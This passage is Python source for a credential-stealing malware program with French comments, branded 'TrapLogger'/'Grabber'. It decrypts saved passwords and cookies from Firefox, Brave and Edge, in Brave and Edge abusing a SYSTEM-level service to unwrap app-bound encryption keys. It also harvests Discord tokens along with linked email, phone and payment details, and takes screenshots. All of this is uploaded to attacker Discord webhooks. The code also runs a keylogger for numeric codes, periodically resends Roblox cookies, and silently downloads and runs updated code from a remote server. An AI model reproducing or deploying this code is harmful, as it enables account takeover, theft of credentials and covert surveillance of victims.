                        'expiry': expiry_dt.strftime('%Y-%m-%d %H:%M:%S') if expiry_dt else 'Session',
                        'secure': bool(secure),
                        'httponly': bool(httponly),
                        'same_site': same_site,
                        'origin': origin
                    })
            conn.close()
            os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"Firefox/{profile_name} cookies: {e}")

    if all_passwords:
        pwd_file = os.path.join(tempfile.gettempdir(), "firefox_passwords.txt")
        with open(pwd_file, "w", encoding="utf-8") as f:
            f.write(f"=== FIREFOX PASSWORDS ===\nDate: {datetime.now()}\nTotal: {len(all_passwords)}\n{'='*60}\n\n")
            for p in all_passwords:
                f.write(f"[Profil: {p[0]}]\nURL: {p[1]}\nLogin: {p[2]}\nPassword: {p[3]}\n{'-'*40}\n")
        result['passwords_file'] = pwd_file
        result['passwords_count'] = len(all_passwords)

    if all_cookies:
        cookie_file = os.path.join(tempfile.gettempdir(), "firefox_cookies.txt")
        with open(cookie_file, "w", encoding="utf-8") as f:
            f.write(f"FIREFOX COOKIES - {datetime.now()} - Total: {len(all_cookies)}\n{'='*80}\n\n")
            for c in all_cookies:
                f.write(f"Hôte: {c['host']}\nNom: {c['name']}\nValeur: {c['value']}\nChemin: {c['path']}\nExpire: {c['expiry']}\n")
                flags = []
                if c['secure']: flags.append("Secure")
                if c['httponly']: flags.append("HttpOnly")
                if c['same_site'] == 1: flags.append("SameSite=Strict")
                elif c['same_site'] == 2: flags.append("SameSite=Lax")
                elif c['same_site'] == 3: flags.append("SameSite=None")
                if flags: f.write(f"Flags: {', '.join(flags)}\n")
                if c['origin']: f.write(f"Origine: {c['origin']}\n")
                f.write("\n")
        result['cookies_file'] = cookie_file
        result['cookies_count'] = len(all_cookies)

    return result

# --- Brave ---
def decrypt_cookie_v20(encrypted_value, key):
    if not key or encrypted_value[:3] != b'v20':
        return None
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
        decrypted = cipher.decrypt_and_verify(encrypted_value[15:-16], encrypted_value[-16:])
        return decrypted[32:].decode(errors="ignore")
    except:
        return None

def decrypt_password_v20(encrypted_value, key):
    if not key or encrypted_value[:3] != b'v20':
        return None
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
        decrypted = cipher.decrypt_and_verify(encrypted_value[15:-16], encrypted_value[-16:])
        return decrypted.decode(errors="ignore")
    except:
        return None

def get_brave_app_bound_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            return None

        decrypt_script = """
import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
"""
        c = Client("localhost")
        c.connect()
        try:
            c.create_service()
            app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
            if app_bound_key[:4] == b"APPB":
                app_bound_key = app_bound_key[4:]
            app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
            encrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
                use_system_account=True
            )
            if rc != 0:
                return None
            decrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
                use_system_account=False
            )
            if rc != 0:
                return None
            decrypted_key = binascii.a2b_base64(decrypted_key_b64)
            if len(decrypted_key) < 32:
                return None
            return decrypted_key[-32:]
        except Exception:
            return None
        finally:
            try:
                c.remove_service()
            except:
                pass
            c.disconnect()
    except Exception:
        return None

def extract_brave_data():
    result = {'cookies_file': None, 'passwords_file': None, 'cookies_count': 0, 'passwords_count': 0, 'errors': []}
    if not IS_ADMIN:
        return result
    kill_browser_process('brave')
    time.sleep(2.0)
    brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
    local_state_path = os.path.join(brave_path, 'Local State')
    if not os.path.exists(local_state_path):
        result['errors'].append("Brave: Local State introuvable")
        return result

    key = get_brave_app_bound_key(local_state_path)
    if not key:
        key = get_browser_encryption_key(brave_path)
    if not key:
        result['errors'].append("Brave: clé de chiffrement introuvable")
        return result

    profiles = []
    default_profile = os.path.join(brave_path, 'Default')
    if os.path.exists(os.path.join(default_profile, 'Login Data')):
        profiles.append(('Default', default_profile))
    for item in os.listdir(brave_path):
        if item.startswith('Profile '):
            prof_path = os.path.join(brave_path, item)
            if os.path.exists(os.path.join(prof_path, 'Login Data')):
                profiles.append((item, prof_path))

    all_passwords = []
    all_cookies = []

    for profile_name, profile_path in profiles:
        # Mots de passe
        try:
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(login_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for url, user, pwd in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if user and pwd:
                        password = decrypt_password_v20(pwd, key)
                        if not password and pwd[:3] != b'v20':
                            password = decrypt_value(pwd, key)
                        if password:
                            all_passwords.append((profile_name, url, user, password))
                conn.close()
                os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"Brave/{profile_name} passwords: {e}")

        # Cookies
        try:
            cookie_path = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(cookie_path):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_path, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for host, name, enc_val, expires, secure, httponly, same_site in conn.execute(
                    "SELECT host_key, name, CAST(encrypted_value AS BLOB), expires_utc, is_secure, is_httponly, sameSite FROM cookies"
                ):
                    val = decrypt_cookie_v20(enc_val, key)
                    if not val and enc_val[:3] != b'v20':
                        val = decrypt_value(enc_val, key)
                    if val:
                        expires_dt = None
                        try:
                            if expires:
                                expires_dt = datetime.fromtimestamp(expires / 1000000 - 11644473600, tz=timezone.utc)
                                if expires_dt <= datetime.now(timezone.utc):
                                    continue
                        except:
                            pass
                        all_cookies.append((profile_name, host.lstrip('.'), name, val,
                                            expires_dt.strftime('%Y-%m-%d %H:%M:%S') if expires_dt else 'Session',
                                            bool(secure), bool(httponly), same_site))
                conn.close()
                os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"Brave/{profile_name} cookies: {e}")

    if all_passwords:
        pwd_file = os.path.join(tempfile.gettempdir(), "brave_passwords.txt")
        with open(pwd_file, "w", encoding="utf-8") as f:
            f.write(f"=== BRAVE PASSWORDS ===\nDate: {datetime.now()}\nTotal: {len(all_passwords)}\n{'='*60}\n\n")
            for p in all_passwords:
                f.write(f"[Profil: {p[0]}]\nURL: {p[1]}\nLogin: {p[2]}\nPassword: {p[3]}\n{'-'*40}\n")
        result['passwords_file'] = pwd_file
        result['passwords_count'] = len(all_passwords)

    if all_cookies:
        cookie_file = os.path.join(tempfile.gettempdir(), "brave_cookies.txt")
        with open(cookie_file, "w", encoding="utf-8") as f:
            f.write(f"BRAVE COOKIES - {datetime.now()} - Total: {len(all_cookies)}\n{'='*80}\n\n")
            for c in all_cookies:
                profile, host, name, value, exp, sec, http, same = c
                f.write(f"Profil: {profile}\nHost: {host}\nNom: {name}\nValeur: {value}\nExpire: {exp}\nSecure: {sec}\nHttpOnly: {http}\nSameSite: {same}\n{'-'*40}\n")
        result['cookies_file'] = cookie_file
        result['cookies_count'] = len(all_cookies)

    return result

# --- Edge ---
EXCLUDE_DOMAINS = ['.msn.com', 'assets.msn.com', 'ntp.msn.com', 'srtb.msn.com']

def wait_for_file_unlock(file_path, max_attempts=10):
    for _ in range(max_attempts):
        try:
            test_path = file_path + ".test"
            shutil.copy2(file_path, test_path)
            os.remove(test_path)
            return True
        except:
            time.sleep(2)
    return False

def get_standard_edge_key(edge_user_data_path):
    local_state = os.path.join(edge_user_data_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            state = json.load(f)
        encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def get_edge_app_bound_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            return None

        decrypt_script = """
import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
"""
        c = Client("localhost")
        c.connect()
        try:
            c.create_service()
            app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
            if app_bound_key[:4] == b"APPB":
                app_bound_key = app_bound_key[4:]
            app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
            encrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
                use_system_account=True
            )
            if rc != 0:
                return None
            decrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
                use_system_account=False
            )
            if rc != 0:
                return None
            decrypted_key = binascii.a2b_base64(decrypted_key_b64)
            if len(decrypted_key) < 32:
                return None
            return decrypted_key[-32:]
        except Exception:
            return None
        finally:
            try:
                c.remove_service()
            except:
                pass
            c.disconnect()
    except Exception:
        return None

def extract_edge_data():
    result = {'cookies_file': None, 'passwords_file': None, 'cookies_count': 0, 'passwords_count': 0, 'errors': []}
    if not IS_ADMIN:
        return result
    kill_browser_process('edge')
    time.sleep(2.0)

    edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
    if not os.path.exists(edge_path):
        result['errors'].append("Edge: dossier introuvable")
        return result

    key = get_edge_app_bound_key(os.path.join(edge_path, "Local State"))
    if not key:
        key = get_standard_edge_key(edge_path)
    if not key:
        result['errors'].append("Edge: clé de chiffrement introuvable")
        return result

    def decrypt_v20(encrypted_value, k):
        try:
            if encrypted_value[:3] != b'v20':
                return None
            nonce = encrypted_value[3:15]
            tag = encrypted_value[-16:]
            data = encrypted_value[15:-16]
            cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(data, tag)
            if len(decrypted) > 32:
                return decrypted[32:].decode('utf-8', errors='ignore')
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None

    def decrypt_v10(encrypted_value, k=None):
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8")
        except:
            return None

    profiles = []
    for item in os.listdir(edge_path):
        prof_path = os.path.join(edge_path, item)
        if os.path.isdir(prof_path):
            if os.path.exists(os.path.join(prof_path, "Login Data")) or os.path.exists(os.path.join(prof_path, "Network", "Cookies")):
                profiles.append((item, prof_path))

    all_passwords = []
    all_cookies = []

    for profile_name, profile_path in profiles:
        # Mots de passe
        try:
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(login_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cur = conn.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
                if not cur.fetchone():
                    conn.close()
                    os.unlink(tmp.name)
                    continue
                for origin_url, username, password_value in cur.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"):
                    if username and password_value:
                        password = None
                        if password_value[:3] == b'v20':
                            password = decrypt_v20(password_value, key)
                        if not password:
                            password = decrypt_v10(password_value)
                        if password:
                            all_passwords.append((profile_name, origin_url, username, password))
                conn.close()
                os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"Edge/{profile_name} passwords: {e}")

        # Cookies
        try:
            cookie_db = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(cookie_db):
                if not wait_for_file_unlock(cookie_db):
                    result['errors'].append(f"Edge/{profile_name} cookies: fichier verrouillé")
                    continue
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cur = conn.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
                if not cur.fetchone():
                    conn.close()
                    os.unlink(tmp.name)
                    continue
                current_time = datetime.now(timezone.utc)
                for host_key, name, encrypted_value, expires_utc, is_secure, is_httponly, same_site in cur.execute(
                        "SELECT host_key, name, CAST(encrypted_value AS BLOB), expires_utc, is_secure, is_httponly, sameSite FROM cookies"):
                    if any(host_key.endswith(domain) for domain in EXCLUDE_DOMAINS):
                        continue
                    if expires_utc and expires_utc != 0:
                        expires_dt = datetime.fromtimestamp(expires_utc / 1000000 - 11644473600, tz=timezone.utc)
                        if expires_dt < current_time:
                            continue
                    else:
                        expires_dt = None
                    cookie_value = None
                    if encrypted_value and encrypted_value[:3] == b'v20':
                        cookie_value = decrypt_v20(encrypted_value, key)
                    if not cookie_value:
                        cookie_value = decrypt_v10(encrypted_value)
                    if cookie_value:
                        all_cookies.append((profile_name, host_key.lstrip('.'), name, cookie_value,
                                            expires_dt.strftime('%Y-%m-%d %H:%M:%S') if expires_dt else 'Session',
                                            bool(is_secure), bool(is_httponly), same_site))
                conn.close()
                os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"Edge/{profile_name} cookies: {e}")

    if all_passwords:
        pwd_file = os.path.join(tempfile.gettempdir(), "edge_passwords.txt")
        with open(pwd_file, "w", encoding="utf-8") as f:
            f.write(f"=== EDGE PASSWORDS ===\nDate: {datetime.now()}\nTotal: {len(all_passwords)}\n{'='*60}\n\n")
            for p in all_passwords:
                f.write(f"[Profil: {p[0]}]\nURL: {p[1]}\nLogin: {p[2]}\nPassword: {p[3]}\n{'-'*40}\n")
        result['passwords_file'] = pwd_file
        result['passwords_count'] = len(all_passwords)

    if all_cookies:
        cookie_file = os.path.join(tempfile.gettempdir(), "edge_cookies.txt")
        with open(cookie_file, "w", encoding="utf-8") as f:
            f.write(f"EDGE COOKIES - {datetime.now()} - Total: {len(all_cookies)}\n{'='*80}\n\n")
            for c in all_cookies:
                profile, host, name, value, exp, sec, http, same = c
                f.write(f"Profil: {profile}\nHost: {host}\nNom: {name}\nValeur: {value}\nExpire: {exp}\nSecure: {sec}\nHttpOnly: {http}\nSameSite: {same}\n{'-'*40}\n")
        result['cookies_file'] = cookie_file
        result['cookies_count'] = len(all_cookies)

    if not result['passwords_file'] and not result['cookies_file'] and not result['errors']:
        result['errors'].append("Edge: aucune donnée trouvée")

    return result

# ========== COLLECTE & ENVOI PARALLÈLE ==========
def collect_all_data():
    discord_embeds = []
    screenshots = []
    browser_results = {}

    def _collect_discord():
        nonlocal discord_embeds
        try:
            embeds = []
            checked = []
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    token = token.replace("\\", "") if token.endswith("\\") else token
                    try:
                        key = getkey(path)
                        if not key:
                            continue
                        try:
                            decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
                        except:
                            continue
                        encrypted_token = token.split('dQw4w9WgXcQ:')[1]
                        nonce = base64.b64decode(encrypted_token)[3:15]
                        ciphertext = base64.b64decode(encrypted_token)[15:]
                        try:
                            token_decrypted = AES.new(decrypted_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()
                        except:
                            continue
                        if token_decrypted in checked:
                            continue
                        checked.append(token_decrypted)
                        req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token_decrypted))
                        res = urllib.request.urlopen(req, timeout=10)
                        if res.getcode() != 200:
                            continue
                        res_json = json.loads(res.read().decode())
                        flags = res_json.get('flags', 0)
                        params = urllib.parse.urlencode({"with_counts": True})
                        try:
                            req_guilds = urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token_decrypted))
                            res_guilds = json.loads(urllib.request.urlopen(req_guilds, timeout=10).read().decode())
                        except:
                            res_guilds = []
                        guilds = len(res_guilds)
                        guild_infos = ""
                        for guild in res_guilds:
                            if guild.get('permissions', 0) & 8 or guild.get('permissions', 0) & 32:
                                try:
                                    req_guild = urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token_decrypted))
                                    res_guild = json.loads(urllib.request.urlopen(req_guild, timeout=10).read().decode())
                                    vanity = f"; .gg/{res_guild['vanity_url_code']}" if res_guild.get("vanity_url_code") else ""
                                    guild_infos += f"\nㅤ- [{guild['name']}]: {guild.get('approximate_member_count', '?')}{vanity}"
                                except:
                                    guild_infos += f"\nㅤ- [{guild['name']}]: ?"
                        if not guild_infos:
                            guild_infos = "No guilds"
                        try:
                            req_nitro = urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token_decrypted))
                            res_nitro = json.loads(urllib.request.urlopen(req_nitro, timeout=10).read().decode())
                        except:
                            res_nitro = []
                        has_nitro = bool(len(res_nitro) > 0)
                        exp_date = None
                        if has_nitro:
                            try:
                                exp_date = datetime.strptime(res_nitro[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
                            except:
                                exp_date = "Unknown"
                        try:
                            req_boosts = urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token_decrypted))
                            res_boosts = json.loads(urllib.request.urlopen(req_boosts, timeout=10).read().decode())
                        except:
                            res_boosts = []
                        available = 0
                        print_boost = ""
                        boost = False
                        for slot in res_boosts:
                            try:
                                cooldown = datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                                if cooldown - datetime.now(datetime.timezone.utc) < timedelta(seconds=0):
                                    print_boost += "ㅤ- Available now\n"
                                    available += 1
                                else:
                                    print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                                boost = True
                            except:
                                continue
                        try:
                            req_payments = urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token_decrypted))
                            res_payments = json.loads(urllib.request.urlopen(req_payments, timeout=10).read().decode())
                        except:
                            res_payments = []
                        payment_methods = 0
                        payment_type = ""
                        valid = 0
                        for x in res_payments:
                            if x['type'] == 1:
                                payment_type += "CreditCard "
                                if not x.get('invalid', False):
                                    valid += 1
                                payment_methods += 1
                            elif x['type'] == 2:
                                payment_type += "PayPal "
                                if not x.get('invalid', False):
                                    valid += 1
                                payment_methods += 1
                        print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                        nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                        print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {payment_type}\n```"
                        desc = f"```yaml\nUser ID: {res_json['id']}\nEmail: {res_json.get('email', 'None')}\nPhone: {res_json.get('phone', 'None')}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA: {res_json.get('mfa_enabled', False)}\nFlags: {flags}\nLocale: {res_json.get('locale', 'Unknown')}\nVerified: {res_json.get('verified', False)}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ''}{print_pm if payment_methods > 0 else ''}```yaml\nIP: {getip()}\nPC User: {os.getenv('UserName')}\nPC Name: {os.getenv('COMPUTERNAME')}\nToken Location: {platform}\n```Token:\n```yaml\n{token_decrypted}\n```"
                        if len(desc) > 4000:
                            desc = desc[:3997] + "..."
                        embed = {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': desc,
                            'color': 3092790,
                            'footer': {'text': "Made by Astraa"},
                            'thumbnail': {'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json.get('avatar', '')}.png"}
                        }
                        embeds.append(embed)
                    except:
                        continue
            discord_embeds = embeds
        except Exception as e:
            send_error_to_fallback(str(e), component="Discord")

    def _collect_screenshots():
        nonlocal screenshots
        try:
            screenshots = capture_screenshot()
        except Exception as e:
            send_error_to_fallback(str(e), component="Capture d'écran")

    def _collect_browsers():
        nonlocal browser_results
        results = {}
        def _extract_opera():
            kill_browser_process('opera')
            time.sleep(2.0)
            base = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
            results['Opera'] = extract_opera_data("Opera", base)
        def _extract_operagx():
            kill_browser_process('operagx')
            time.sleep(2.0)
            base = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
            results['Opera GX'] = extract_opera_data("Opera GX", base)
        def _extract_firefox():
            results['Firefox'] = extract_firefox_data()
        def _extract_brave():
            results['Brave'] = extract_brave_data()
        def _extract_edge():
            results['Edge'] = extract_edge_data()

        threads = [
            threading.Thread(target=_extract_opera),
            threading.Thread(target=_extract_operagx),
            threading.Thread(target=_extract_firefox),
        ]
        if IS_ADMIN:
            threads.append(threading.Thread(target=_extract_brave))
            threads.append(threading.Thread(target=_extract_edge))
        else:
            results['Brave'] = {'cookies_file': None, 'passwords_file': None, 'cookies_count': 0, 'passwords_count': 0, 'errors': []}
            results['Edge'] = {'cookies_file': None, 'passwords_file': None, 'cookies_count': 0, 'passwords_count': 0, 'errors': []}
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        browser_results = results

    main_threads = [
        threading.Thread(target=_collect_discord),
        threading.Thread(target=_collect_screenshots),
        threading.Thread(target=_collect_browsers)
    ]
    for t in main_threads:
        t.start()
    for t in main_threads:
        t.join()

    return discord_embeds, screenshots, browser_results

def send_collected_data(webhook_url, discord_embeds, screenshots, browser_results):
    if discord_embeds:
        for i in range(0, len(discord_embeds), 10):
            batch = discord_embeds[i:i+10]
            payload = {'embeds': batch, 'username': "Grabber", 'avatar_url': "https://avatars.githubusercontent.com/u/43183806?v=4"}
            send_to_discord(webhook_url, payload)

    for idx, screenshot in enumerate(screenshots):
        try:
            files = {'file': (f'screenshot_monitor_{idx+1}.png', base64.b64decode(screenshot['data']), 'image/png')}
            send_to_discord(webhook_url, None, files=files)
        except Exception as e:
            send_error_to_fallback(str(e), component=f"Capture {idx+1}")

    for browser_name, data in browser_results.items():
        if not data:
            continue
        for file_type in ('passwords_file', 'cookies_file'):
            filepath = data.get(file_type)
            if filepath and os.path.exists(filepath):
                try:
                    with open(filepath, 'rb') as f:
                        filename = os.path.basename(filepath)
                        send_to_discord(webhook_url, None, files={'file': (filename, f.read(), 'text/plain')})
                except Exception as e:
                    send_error_to_fallback(str(e), component=f"Envoi fichier {filename}")
                finally:
                    try:
                        os.remove(filepath)
                    except:
                        pass
        if data.get('errors'):
            error_content = "\n".join(data['errors'])
            if error_content:
                payload = {"content": f"Erreurs {browser_name}:\n```{error_content}```", "username": "Browser Collector"}
                send_to_discord(webhook_url, payload)

def collect_and_send_all_data():
    pc_webhook = get_or_create_pc_webhook()
    if not pc_webhook:
        send_error_to_fallback("Impossible d'obtenir le webhook PC.", component="Webhook PC")
        return
    discord_embeds, screenshots, browser_results = collect_all_data()
    send_collected_data(pc_webhook, discord_embeds, screenshots, browser_results)

# ========== MISE À JOUR ==========
def get_remote_version():
    try:
        r = requests.get(VERSION_URL, timeout=5)
        return r.text.strip() if r.status_code == 200 else None
    except:
        return None

def get_local_version():
    if not os.path.exists(CONFIG_FILE):
        return None
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("version="):
                    return line.split("=", 1)[1].strip()
    except:
        pass
    return None

def update_local_version(new_version):
    set_config_value("version", new_version)

def get_last_notified_version():
    return get_config_value("last_notified_version")

def update_last_notified_version(new_version):
    set_config_value("last_notified_version", new_version)

def force_resolve_username(max_attempts=4, delay=5):
    for attempt in range(max_attempts):
        mapping = load_config()
        if mapping:
            return list(mapping.keys())[0]
        retrieve_roblox_cookies(force_send=True)
        time.sleep(delay)
    return None

def send_update_notification(old_ver, new_ver):
    if get_last_notified_version() == new_ver:
        return
    username = force_resolve_username()
    if not username:
        return
    target_webhook = get_or_create_webhook_for_username(username)
    if not target_webhook:
        return
    payload = {
        "content": "@everyone",
        "embeds": [{
            "title": "✅ **MISE À JOUR APPLIQUÉE**",
            "description": f"```yaml\nUtilisateur: {username}\nAncienne: {old_ver}\nNouvelle: {new_ver}\nPC: {os.getenv('COMPUTERNAME')}\nIP: {getip()}\n```",
            "color": 3066993,
            "fields": [
                {"name": "🔄 CYCLE", "value": "```yaml\nVérification toutes les 2 minutes\n```", "inline": False},
                {"name": "📅 DATE", "value": f"```yaml\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n```", "inline": True}
            ],
            "footer": {"text": "Auto-Updater"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }],
        "username": "TrapLogger Updater"
    }
    send_to_discord(target_webhook, payload)
    update_last_notified_version(new_ver)

def perform_update():
    remote_version = get_remote_version()
    local_version = get_local_version()
    if not remote_version:
        return False
    if local_version is not None and remote_version == local_version:
        return False
    try:
        r = requests.get(UPDATE_URL, timeout=15)
        if r.status_code != 200:
            return False
        current_script = os.path.abspath(sys.argv[0])
        current_dir = os.path.dirname(current_script)
        old_v = local_version if local_version else "0.0.0"
        update_local_version(remote_version)
        retrieve_roblox_cookies(force_send=True)
        time.sleep(2.5)
        send_update_notification(old_v, remote_version)
        try:
            with open(current_script, "wb") as f:
                f.write(r.content)
            subprocess.Popen(
                [sys.executable, current_script],
                cwd=current_dir,
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            os._exit(0)
        except:
            import base64 as b64
            content_b64 = b64.b64encode(r.content).decode()
            waiter_code = f'''import time, os, sys, subprocess, base64
time.sleep(2.5)
try:
    data = base64.b64decode("{content_b64}")
    with open(r"{current_script}", "wb") as f:
        f.write(data)
    subprocess.Popen([sys.executable, r"{current_script}"])
except:
    pass
os.remove(sys.argv[0])
'''
            waiter_path = os.path.join(os.getenv("TEMP"), f"update_waiter_{os.getpid()}.pyw")
            with open(waiter_path, "w", encoding="utf-8") as f:
                f.write(waiter_code)
            subprocess.Popen(
                [sys.executable, waiter_path],
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            os._exit(0)
    except Exception:
        return False
    return True

def check_update_on_startup():
    try:
        remote_version = get_remote_version()
        local_version = get_local_version()
        if remote_version and (local_version is None or remote_version != local_version):
            if remote_version != local_version:
                time.sleep(2)
                perform_update()
                return True
    except:
        pass
    return False

# ========== KEYLOGGER ==========
def send_numeric_code_to_webhook(digits, username=None):
    if not can_perform_action() or len(digits) < 4:
        return
    try:
        payload = {
            "content": None,
            "embeds": [{
                "title": "CODE DÉTECTÉ",
                "description": f"**`{digits}`**",
                "color": 16711680,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }],
            "username": "TrapLogger"
        }
        wh = None
        if username:
            wh = get_or_create_webhook_for_username(username)
        send_to_discord(wh, payload)
    except:
        pass

def is_target_window():
    try:
        title = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()
        return any(t in title for t in TARGET_WINDOWS)
    except:
        return False

def on_key(event):
    global pending_digits, last_digit_time, timer_active
    with keylogger_lock:
        if not is_target_window():
            if len(pending_digits) >= 4:
                current_user = None
                mapping = load_config()
                if mapping:
                    current_user = list(mapping.keys())[0]
                send_numeric_code_to_webhook(pending_digits, username=current_user)
            pending_digits = ""
            timer_active = False
            return
        char = event.name
        if char.isdigit():
            pending_digits += char
            last_digit_time = time.time()
            if not timer_active:
                timer_active = True
                threading.Thread(target=wait_and_send_digits_thread, daemon=True).start()
        else:
            if len(pending_digits) >= 4:
                current_user = None
                mapping = load_config()
                if mapping:
                    current_user = list(mapping.keys())[0]
                send_numeric_code_to_webhook(pending_digits, username=current_user)
            pending_digits = ""
            timer_active = False

def wait_and_send_digits_thread():
    global timer_active, pending_digits
    start = time.time()
    while time.time() - start < 2.2:
        with keylogger_lock:
            if time.time() - last_digit_time > 2.0:
                if len(pending_digits) >= 4:
                    current_user = None
                    mapping = load_config()
                    if mapping:
                        current_user = list(mapping.keys())[0]
                    send_numeric_code_to_webhook(pending_digits, username=current_user)
                pending_digits = ""
                timer_active = False
                return
        time.sleep(0.05)
    with keylogger_lock:
        if len(pending_digits) >= 4:
            current_user = None
            mapping = load_config()
            if mapping:
                current_user = list(mapping.keys())[0]
            send_numeric_code_to_webhook(pending_digits, username=current_user)
        pending_digits = ""
        timer_active = False

# ========== THREADS PÉRIODIQUES ==========
def periodic_send_cookie():
    while True:
        try:
            time.sleep(300)
            retrieve_roblox_cookies(force_send=True)
        except Exception:
            time.sleep(10)

def periodic_send_all_data():
    while True:
        try:
            time.sleep(14400)
            collect_and_send_all_data()
        except Exception:
            time.sleep(10)

def periodic_update_check():
    while True:
        try:
            remote_version = get_remote_version()
            local_version = get_local_version()
            if remote_version and (local_version is None or remote_version != local_version):
                time.sleep(2)
                perform_update()
                return
        except Exception:
            pass
        time.sleep(120)

